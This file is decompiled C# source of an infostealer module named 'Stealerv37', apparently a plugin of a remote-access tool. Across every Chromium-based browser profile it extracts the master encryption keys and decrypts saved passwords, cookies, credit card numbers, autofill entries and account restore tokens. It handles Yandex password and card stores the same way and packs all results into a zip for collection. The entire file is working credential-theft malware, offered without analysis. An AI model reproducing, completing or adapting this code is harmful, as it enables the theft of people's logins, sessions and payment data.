// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Browsers.Chromium
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper;
using Intelix.Helper.Data;
using Intelix.Helper.Encrypted;
using Intelix.Helper.Sql;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

#nullable disable
namespace Intelix.Targets.Browsers;

public class Chromium : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    Parallel.ForEach<string>((IEnumerable<string>) Paths.Chromium, (Action<string>) (browser =>
    {
      if (!Directory.Exists(browser))
        return;
      Parallel.ForEach<string>((IEnumerable<string>) Directory.GetDirectories(browser), (Action<string>) (profile => this.ProfileCollect(zip, counter, browser, profile)));
    }));
  }

  private void ProfileCollect(InMemoryZip zip, Counter counter, string browser, string profile)
  {
    string localstate = browser + "\\Local State";
    string browsername = Paths.GetBrowserName(browser);
    string profilename = Path.GetFileName(profile);
    byte[] masterv10 = LocalState.MasterKeyV10(localstate);
    byte[] masterv20 = LocalState.MasterKeyV20(localstate);
    Counter.CounterBrowser counterBrowser = new Counter.CounterBrowser();
    counterBrowser.Profile = profile;
    counterBrowser.BrowserName = browsername;
    object[][] source1 = new object[7][]
    {
      new object[3]
      {
        (object) "Login Data",
        (object) Path.Combine(profile, "Login Data"),
        (object) new string[1]{ "logins" }
      },
      new object[3]
      {
        (object) "Login Data For Account",
        (object) Path.Combine(profile, "Login Data For Account"),
        (object) new string[1]{ "logins" }
      },
      new object[3]
      {
        (object) "Network Cookies",
        (object) Path.Combine(profile, "Network", "Cookies"),
        (object) new string[1]{ "cookies" }
      },
      new object[3]
      {
        (object) "Cookies",
        (object) Path.Combine(profile, "Cookies"),
        (object) new string[1]{ "cookies" }
      },
      new object[3]
      {
        (object) "Web Data",
        (object) Path.Combine(profile, "Web Data"),
        (object) new string[5]
        {
          "AutoFill",
          "credit_cards",
          "token_service",
          "masked_credit_cards",
          "masked_ibans"
        }
      },
      new object[3]
      {
        (object) "Ya Passman Data",
        (object) Path.Combine(profile, "Ya Passman Data"),
        (object) new string[1]{ "logins" }
      },
      new object[3]
      {
        (object) "Ya Credit Cards",
        (object) Path.Combine(profile, "Ya Credit Cards"),
        (object) new string[1]{ "records" }
      }
    };
    Dictionary<string, Action<SqLite>> handlers = new Dictionary<string, Action<SqLite>>((IEqualityComparer<string>) StringComparer.OrdinalIgnoreCase)
    {
      {
        "Login Data/logins",
        (Action<SqLite>) (sSqLite => this.Password(zip, counterBrowser, sSqLite, profilename, browsername, masterv10, masterv20))
      },
      {
        "Login Data For Account/logins",
        (Action<SqLite>) (sSqLite => this.Password(zip, counterBrowser, sSqLite, profilename, browsername, masterv10, masterv20))
      },
      {
        "Cookies/cookies",
        (Action<SqLite>) (sSqLite => this.Cookies(zip, counterBrowser, sSqLite, profilename, browsername, masterv10, masterv20))
      },
      {
        "Network Cookies/cookies",
        (Action<SqLite>) (sSqLite => this.Cookies(zip, counterBrowser, sSqLite, profilename, browsername, masterv10, masterv20))
      },
      {
        "Web Data/AutoFill",
        (Action<SqLite>) (sSqLite => this.AutoFill(zip, counterBrowser, sSqLite, profilename, browsername, masterv10, masterv20))
      },
      {
        "Web Data/credit_cards",
        (Action<SqLite>) (sSqLite => this.CreditCards(zip, counterBrowser, sSqLite, profilename, browsername, masterv10, masterv20))
      },
      {
        "Web Data/token_service",
        (Action<SqLite>) (sSqLite => this.TokenRestore(zip, counterBrowser, sSqLite, profilename, browsername, masterv10, masterv20))
      },
      {
        "Web Data/masked_credit_cards",
        (Action<SqLite>) (sSqLite => this.MaskCreditCards(zip, counterBrowser, sSqLite, profilename, browsername, masterv10, masterv20))
      },
      {
        "Web Data/masked_ibans",
        (Action<SqLite>) (sSqLite => this.MaskedIbans(zip, counterBrowser, sSqLite, profilename, browsername, masterv10, masterv20))
      },
      {
        "Ya Passman Data/logins",
        (Action<SqLite>) (sSqLite => this.YandexPassword(zip, counterBrowser, sSqLite, profilename, browsername, masterv10, masterv20))
      },
      {
        "Ya Credit Cards/records",
        (Action<SqLite>) (sSqLite => this.YandexGetCard(zip, counterBrowser, sSqLite, profilename, browsername, masterv10, masterv20))
      }
    };
    Parallel.ForEach<object[]>((IEnumerable<object[]>) source1, (Action<object[]>) (file =>
    {
      string name = (string) file[0];
      string path = (string) file[1];
      string[] source2 = (string[]) file[2];
      if (!File.Exists(path))
        return;
      byte[] bytes;
      try
      {
        bytes = File.ReadAllBytes(path);
      }
      catch
      {
        return;
      }
      Parallel.ForEach<string>((IEnumerable<string>) source2, (Action<string>) (table =>
      {
        try
        {
          SqLite sqLite = new SqLite(bytes);
          sqLite.ReadTable(table);
          Action<SqLite> action;
          if (!handlers.TryGetValue($"{name}/{table}", out action))
            return;
          action(sqLite);
        }
        catch
        {
        }
      }));
    }));
    if ((long) counterBrowser.Cookies == 0L && (long) counterBrowser.Password == 0L && (long) counterBrowser.CreditCards == 0L && (long) counterBrowser.AutoFill == 0L && (long) counterBrowser.RestoreToken == 0L && (long) counterBrowser.MaskCreditCard == 0L && (long) counterBrowser.MaskedIban == 0L)
      return;
    counter.Browsers.Add(counterBrowser);
  }

  private void Password(
    InMemoryZip zip,
    Counter.CounterBrowser counterBrowser,
    SqLite sSqLite,
    string profilename,
    string browsername,
    byte[] masterv10,
    byte[] masterv20)
  {
    if (masterv10 == null && masterv20 == null)
      return;
    ConcurrentBag<string> lines = new ConcurrentBag<string>();
    Parallel.For(0, sSqLite.GetRowCount(), (Action<int>) (i =>
    {
      try
      {
        string str1 = sSqLite.GetValue(i, 0);
        string str2 = sSqLite.GetValue(i, 3);
        byte[] bytes1 = Encoding.Default.GetBytes(sSqLite.GetValue(i, 5));
        if (bytes1 == null || string.IsNullOrEmpty(str1) || string.IsNullOrEmpty(str2))
          return;
        byte[] bytes2 = AesGcm.DecryptBrowser(bytes1, masterv10, masterv20, false);
        if (bytes2 == null)
          return;
        string str3 = Encoding.UTF8.GetString(bytes2);
        string[] strArray = new string[7]
        {
          "Hostname: ",
          str1,
          "\nUsername: ",
          str2,
          "\nPassword: ",
          str3,
          "\n\n"
        };
        lines.Add(string.Concat(strArray));
        ++counterBrowser.Password;
      }
      catch
      {
      }
    }));
    zip.AddTextFile($"Passwords\\Passwords_[{browsername}]{profilename}.txt", string.Concat((IEnumerable<string>) lines));
  }

  private void Cookies(
    InMemoryZip zip,
    Counter.CounterBrowser counterBrowser,
    SqLite sSqLite,
    string profilename,
    string browsername,
    byte[] masterv10,
    byte[] masterv20)
  {
    if (masterv10 == null && masterv20 == null)
      return;
    ConcurrentBag<string> lines = new ConcurrentBag<string>();
    Parallel.For(0, sSqLite.GetRowCount(), (Action<int>) (i =>
    {
      try
      {
        byte[] bytes1 = Encoding.Default.GetBytes(sSqLite.GetValue(i, 5));
        string str1 = sSqLite.GetValue(i, 4);
        string str2 = sSqLite.GetValue(i, 1);
        string str3 = sSqLite.GetValue(i, 3);
        string str4 = sSqLite.GetValue(i, 6);
        string str5 = sSqLite.GetValue(i, 7);
        if (string.IsNullOrEmpty(str2) || string.IsNullOrEmpty(str3) || string.IsNullOrEmpty(str4) || string.IsNullOrEmpty(str5))
          return;
        if (!string.IsNullOrEmpty(str1))
        {
          string[] strArray = new string[10]
          {
            str2,
            "\tTRUE\t",
            str4,
            "\tFALSE\t",
            str5,
            "\t",
            str3,
            "\t",
            str1,
            "\n"
          };
          lines.Add(string.Concat(strArray));
        }
        else
        {
          byte[] bytes2 = AesGcm.DecryptBrowser(bytes1, masterv10, masterv20, true);
          if (bytes2 == null)
            return;
          string str6 = Encoding.UTF8.GetString(bytes2);
          string[] strArray = new string[10]
          {
            str2,
            "\tTRUE\t",
            str4,
            "\tFALSE\t",
            str5,
            "\t",
            str3,
            "\t",
            str6,
            "\n"
          };
          lines.Add(string.Concat(strArray));
          ++counterBrowser.Cookies;
        }
      }
      catch
      {
      }
    }));
    zip.AddTextFile($"Cookies\\Cookies_[{browsername}]{profilename}.txt", string.Concat((IEnumerable<string>) lines));
  }

  private void AutoFill(
    InMemoryZip zip,
    Counter.CounterBrowser counterBrowser,
    SqLite sSqLite,
    string profilename,
    string browsername,
    byte[] masterv10,
    byte[] masterv20)
  {
    ConcurrentBag<string> lines = new ConcurrentBag<string>();
    Parallel.For(0, sSqLite.GetRowCount(), (Action<int>) (i =>
    {
      try
      {
        string str1 = sSqLite.GetValue(i, 0);
        string str2 = sSqLite.GetValue(i, 1);
        if (string.IsNullOrEmpty(str2) || string.IsNullOrEmpty(str1))
          return;
        string[] strArray = new string[5]
        {
          "Name: ",
          str1,
          "\nValue: ",
          str2,
          "\n\n"
        };
        lines.Add(string.Concat(strArray));
        ++counterBrowser.AutoFill;
      }
      catch
      {
      }
    }));
    zip.AddTextFile($"AutoFills\\AutoFill_[{browsername}]{profilename}.txt", string.Concat((IEnumerable<string>) lines));
  }

  private void CreditCards(
    InMemoryZip zip,
    Counter.CounterBrowser counterBrowser,
    SqLite sSqLite,
    string profilename,
    string browsername,
    byte[] masterv10,
    byte[] masterv20)
  {
    if (masterv10 == null && masterv20 == null)
      return;
    ConcurrentBag<string> lines = new ConcurrentBag<string>();
    Parallel.For(0, sSqLite.GetRowCount(), (Action<int>) (i =>
    {
      try
      {
        byte[] bytes1 = Encoding.Default.GetBytes(sSqLite.GetValue(i, 4));
        string str1 = sSqLite.GetValue(i, 3);
        string str2 = sSqLite.GetValue(i, 2);
        string str3 = sSqLite.GetValue(i, 1);
        if (bytes1 == null || string.IsNullOrEmpty(str1) || string.IsNullOrEmpty(str2) || string.IsNullOrEmpty(str3))
          return;
        byte[] bytes2 = AesGcm.DecryptBrowser(bytes1, masterv10, masterv20, false);
        if (bytes2 == null)
          return;
        string[] strArray = new string[9]
        {
          "Number: ",
          Encoding.UTF8.GetString(bytes2),
          "\nExp: ",
          str2,
          "/",
          str1,
          "\nHolder: ",
          str3,
          "\n\n"
        };
        lines.Add(string.Concat(strArray));
        ++counterBrowser.CreditCards;
      }
      catch
      {
      }
    }));
    zip.AddTextFile($"CreditCards\\CreditCards_[{browsername}]{profilename}.txt", string.Concat((IEnumerable<string>) lines));
  }

  private void TokenRestore(
    InMemoryZip zip,
    Counter.CounterBrowser counterBrowser,
    SqLite sSqLite,
    string profilename,
    string browsername,
    byte[] masterv10,
    byte[] masterv20)
  {
    if (masterv10 == null && masterv20 == null)
      return;
    ConcurrentBag<string> lines = new ConcurrentBag<string>();
    Parallel.For(0, sSqLite.GetRowCount(), (Action<int>) (i =>
    {
      try
      {
        string str = sSqLite.GetValue(i, 0);
        byte[] bytes1 = Encoding.Default.GetBytes(sSqLite.GetValue(i, 1));
        if (bytes1 == null)
          return;
        byte[] bytes2 = AesGcm.DecryptBrowser(bytes1, masterv10, masterv20, false);
        if (bytes2 == null)
          return;
        string restore = $"{Encoding.UTF8.GetString(bytes2)}:{str.Replace("AccountId-", "")}\n";
        lines.Add(restore);
        ++counterBrowser.RestoreToken;
        if (!str.Contains("AccountId"))
          return;
        zip.AddTextFile($"Cookies\\CookiesRestore_[{browsername}]{profilename}.txt", RestoreCookies.CRestore(restore));
      }
      catch
      {
      }
    }));
    zip.AddTextFile($"RestoreToken\\RestoreToken_[{browsername}]{profilename}.txt", string.Concat((IEnumerable<string>) lines));
  }

  private void YandexPassword(
    InMemoryZip zip,
    Counter.CounterBrowser counterBrowser,
    SqLite sSqLite,
    string profilename,
    string browsername,
    byte[] masterv10,
    byte[] masterv20)
  {
    if (masterv10 == null)
      return;
    byte[] encryptionKey = LocalEncryptor.ExtractEncryptionKey(sSqLite, masterv10);
    if (encryptionKey == null || encryptionKey.Length != 32 /*0x20*/)
      return;
    ConcurrentBag<string> lines = new ConcurrentBag<string>();
    Parallel.For(0, sSqLite.GetRowCount(), (Action<int>) (i =>
    {
      try
      {
        string url = sSqLite.GetValue(i, 0);
        string username_element = sSqLite.GetValue(i, 2);
        string username_value = sSqLite.GetValue(i, 3);
        string password_element = sSqLite.GetValue(i, 4);
        string signon_realm = sSqLite.GetValue(i, 7);
        byte[] bytes1 = Encoding.Default.GetBytes(sSqLite.GetValue(i, 5));
        if (bytes1.Length == 0)
          return;
        byte[] bytes2 = YaAuthenticatedData.Decrypt(encryptionKey, bytes1, url, username_element, password_element, username_value, signon_realm);
        string[] strArray = new string[7]
        {
          "Hostname: ",
          url,
          "\nUsername: ",
          username_value,
          "\nPassword: ",
          Encoding.UTF8.GetString(bytes2),
          "\n\n"
        };
        lines.Add(string.Concat(strArray));
        ++counterBrowser.Password;
      }
      catch
      {
      }
    }));
    zip.AddTextFile($"Passwords\\Passwords_[{browsername}]{profilename}.txt", string.Concat((IEnumerable<string>) lines));
  }

  private void YandexGetCard(
    InMemoryZip zip,
    Counter.CounterBrowser counterBrowser,
    SqLite sSqLite,
    string profilename,
    string browsername,
    byte[] masterv10,
    byte[] masterv20)
  {
    if (masterv10 == null)
      return;
    byte[] encryptionKey = LocalEncryptor.ExtractEncryptionKey(sSqLite, masterv10);
    if (encryptionKey == null || encryptionKey.Length != 32 /*0x20*/)
      return;
    ConcurrentBag<string> lines = new ConcurrentBag<string>();
    Parallel.For(0, sSqLite.GetRowCount(), (Action<int>) (i =>
    {
      try
      {
        byte[] bytes1 = Encoding.Default.GetBytes(sSqLite.GetValue(i, 0));
        byte[] bytes2 = Encoding.Default.GetBytes(sSqLite.GetValue(i, 2));
        string input1 = sSqLite.GetValue(i, 1);
        byte[] numArray1 = new byte[12];
        Array.Copy((Array) bytes2, 0, (Array) numArray1, 0, 12);
        int length = bytes2.Length - 12 - 16 /*0x10*/;
        byte[] numArray2 = new byte[length];
        Array.Copy((Array) bytes2, 12, (Array) numArray2, 0, length);
        byte[] numArray3 = new byte[16 /*0x10*/];
        Array.Copy((Array) bytes2, bytes2.Length - 16 /*0x10*/, (Array) numArray3, 0, 16 /*0x10*/);
        string input2 = Encoding.UTF8.GetString(AesGcm256.Decrypt(encryptionKey, numArray1, bytes1, numArray2, numArray3));
        Match match1 = Regex.Match(input2, "[\"']?full_card_number[\"']?\\s*:\\s*[\"']?(?<v>[\\d\\s\\-]+)[\"']?", RegexOptions.IgnoreCase);
        string str1 = match1.Success ? match1.Groups["v"].Value.Trim() : (string) null;
        if (string.IsNullOrEmpty(str1))
        {
          Match match2 = Regex.Match(input2, "[\"']?(?:card_number|number)[\"']?\\s*:\\s*[\"']?(?<v>[\\d\\s\\-]+)[\"']?", RegexOptions.IgnoreCase);
          str1 = match2.Success ? match2.Groups["v"].Value.Trim() : (string) null;
        }
        Match match3 = Regex.Match(input1, "[\"']?expire_date_month[\"']?\\s*:\\s*[\"']?(?<m>\\d{1,2})[\"']?", RegexOptions.IgnoreCase);
        Match match4 = Regex.Match(input1, "[\"']?expire_date_year[\"']?\\s*:\\s*[\"']?(?<y>\\d{2,4})[\"']?", RegexOptions.IgnoreCase);
        string str2 = match3.Success ? match3.Groups["m"].Value.PadLeft(2, '0') : (string) null;
        string str3 = match4.Success ? match4.Groups["y"].Value : (string) null;
        Match match5 = Regex.Match(input1, "[\"']?card_holder[\"']?\\s*:\\s*[\"'](?<v>(?:\\\\.|[^\"])*)[\"']", RegexOptions.IgnoreCase | RegexOptions.Singleline);
        string str4 = match5.Success ? match5.Groups["v"].Value : (string) null;
        if (string.IsNullOrEmpty(str4))
        {
          Match match6 = Regex.Match(input1, "[\"']?(?:cardholder|holder|name)[\"']?\\s*:\\s*[\"'](?<v>(?:\\\\.|[^\"])*)[\"']", RegexOptions.IgnoreCase | RegexOptions.Singleline);
          str4 = match6.Success ? match6.Groups["v"].Value : str4;
        }
        if (!string.IsNullOrEmpty(str4))
        {
          str4 = Regex.Replace(Regex.Unescape(str4), "\\\\u([0-9A-Fa-f]{4})", (MatchEvaluator) (m => ((char) Convert.ToInt32(m.Groups[1].Value, 16 /*0x10*/)).ToString())).Trim();
          if (Regex.IsMatch(str4, "^[A-Za-z0-9\\+/=]{8,}$"))
          {
            try
            {
              string str5 = Encoding.UTF8.GetString(Convert.FromBase64String(str4));
              if (!string.IsNullOrWhiteSpace(str5))
                str4 = str5.Trim();
            }
            catch
            {
            }
          }
        }
        if (string.IsNullOrEmpty(str1))
          str1 = "Unknown";
        if (string.IsNullOrEmpty(str2))
          str2 = "Unknown";
        if (string.IsNullOrEmpty(str3))
          str3 = "Unknown";
        if (string.IsNullOrEmpty(str4))
          str4 = "Unknown";
        string[] strArray = new string[9]
        {
          "Number: ",
          str1,
          "\nExp: ",
          str2,
          "/",
          str3,
          "\nHolder: ",
          str4,
          "\n\n"
        };
        lines.Add(string.Concat(strArray));
        ++counterBrowser.CreditCards;
      }
      catch
      {
      }
    }));
    zip.AddTextFile($"CreditCards\\CreditCards_[{browsername}]{profilename}.txt", string.Concat((IEnumerable<string>) lines));
  }

  private void MaskCreditCards(
    InMemoryZip zip,
    Counter.CounterBrowser counterBrowser,
    SqLite sSqLite,
    string profilename,
    string browsername,
    byte[] masterv10,
    byte[] masterv20)
  {
    ConcurrentBag<string> lines = new ConcurrentBag<string>();
    Parallel.For(0, sSqLite.GetRowCount(), (Action<int>) (i =>
    {
      try
      {
        string[] strArray = new string[17]
        {
          "Name On Card: ",
          sSqLite.GetValue(i, 1),
          "\nNetwork: ",
          sSqLite.GetValue(i, 2),
          "\nCard Last Number: ",
          sSqLite.GetValue(i, 3),
          "\nExp: ",
          sSqLite.GetValue(i, 4),
          "/",
          sSqLite.GetValue(i, 5),
          "\nBank Name: ",
          sSqLite.GetValue(i, 6),
          "\nNickName: ",
          sSqLite.GetValue(i, 7),
          "\nProduct Description: ",
          sSqLite.GetValue(i, 12),
          "\n\n"
        };
        lines.Add(string.Concat(strArray));
        ++counterBrowser.MaskCreditCard;
      }
      catch
      {
      }
    }));
    zip.AddTextFile($"MaskCreditCards\\MaskCreditCards_[{browsername}]{profilename}.txt", string.Concat((IEnumerable<string>) lines));
  }

  private void MaskedIbans(
    InMemoryZip zip,
    Counter.CounterBrowser counterBrowser,
    SqLite sSqLite,
    string profilename,
    string browsername,
    byte[] masterv10,
    byte[] masterv20)
  {
    ConcurrentBag<string> lines = new ConcurrentBag<string>();
    Parallel.For(0, sSqLite.GetRowCount(), (Action<int>) (i =>
    {
      try
      {
        string str1 = sSqLite.GetValue(i, 1);
        string str2 = sSqLite.GetValue(i, 2);
        string[] strArray = new string[7]
        {
          "Nickname: ",
          sSqLite.GetValue(i, 3),
          "\nPrefix: ",
          str1,
          "\nSuffix: ",
          str2,
          "\n\n"
        };
        lines.Add(string.Concat(strArray));
        ++counterBrowser.MaskedIban;
      }
      catch
      {
      }
    }));
    zip.AddTextFile($"MaskedIbans\\MaskedIbans[{browsername}]{profilename}.txt", string.Concat((IEnumerable<string>) lines));
  }
}
